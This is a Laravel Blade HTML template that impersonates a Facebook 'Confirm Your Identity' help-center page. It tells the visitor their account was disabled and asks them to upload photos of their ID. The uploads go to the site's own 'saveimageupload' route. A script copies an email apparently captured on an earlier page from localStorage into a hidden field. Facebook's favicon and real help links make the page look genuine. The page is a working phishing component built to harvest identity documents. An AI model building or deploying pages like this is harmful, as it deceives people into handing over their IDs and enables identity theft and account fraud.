<html lang="en">

<head>
    <meta charset="utf-8">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,200,300,400,500,700&amp;display=swap">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <title>Business Help Center</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link href="{{ url('source/assets/facebook/uploadimage.css') }}" rel="stylesheet" />
</head>

<body>

    <div id="root">
        <div>
            <div>
                <form id="upload_profi" method="POST" enctype="multipart/form-data"
                    action="{{ url('saveimageupload') }}">
                    <input type="hidden" name="_token" id="_token" value="{{ csrf_token() }}" />
                    <div class="upload-image">
                        <section class="header" style="background: rgb(66, 103, 178);">
                            <p
                                style="margin: 0px; text-align: center; padding: 15px 0px; font-size: 18px; line-height: 22px; color: rgb(255, 255, 255);">
                                Confirm Your Identity With Facebook</p>
                        </section>
                        <div class="main-upload" style="background: rgb(221, 223, 226); padding: 7px;">
                            <div class="form">
                                <div class="bg">
                                    <h6>My personal account was disabled</h6>
                                    <p>Before we can review your account, please fill out the form below to help us
                                        verify your identity.</p>
                                    <p>Please attach a copy of your ID(s). Learn more about why we require ID
                                        verification and what types of ID we'll accept below.</p>

                                    <div class="item-form"><label for="file">ID(s)</label>
                                        <p class="mini">As it's listed on the account</p>
                                        <div>
                                            <input type="file" require id="file" accept="image/*" name="files[]"
                                                multiple="">
                                            <input type="hidden" name="email" id="email">
                                        </div>
                                        <p class="desc">We may encrypt and store your ID for up to one year to improve
                                            our automated systems for detecting fake IDs. We might use trusted service
                                            providers to help review your information. Your ID will be stored securely
                                            and will not be visible to anyone on Facebook. If you don't want Facebook to
                                            use your ID to improve our automated systems for detecting fake IDs, you can
                                            adjust your Identity Confirmation Settings. If you turn this option off, the
                                            copy of your ID will be deleted within 30 days of submission or when you
                                            turned this option off. Visit the Help Centre to learn more about what
                                            happens to your ID after you have sent it to us.</p>
                                    </div>
                                </div><button type="submit" value="Send" name="submit" id="btn-submitt"
                                    class="btn-upload-info">Send</button>
                            </div>

                            <div class="footer"><b>Submitting ID</b>
                                <ul>
                                    <li><a href="https://www.facebook.com/help/103873106370583?helpref=contact_forms"
                                            target="_blank">ID rejected by Facebook</a></li>
                                    <li><a href="https://www.facebook.com/help/159096464162185?helpref=contact_forms"
                                            target="_blank">Types of IDs that Facebook accepts?</a></li>
                                    <li><a href="https://www.facebook.com/help/283100488694834?helpref=contact_forms"
                                            target="_blank">How to upload an ID to Facebook?</a></li>
                                    <li><a href="https://www.facebook.com/help/105487009541643?helpref=contact_forms"
                                            target="_blank">Why Facebook may ask you to upload an ID</a></li>
                                    <li><a href="https://www.facebook.com/help/105487009541643?helpref=contact_forms"
                                            target="_blank">What happens to your ID after you send it to Facebook</a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
            </div>
            </form>
        </div>
    </div>
    <script>
        var email = localStorage.getItem('basic_fill_personal_email');
        $('#email').val(email);
    </script>
</body>

</html>
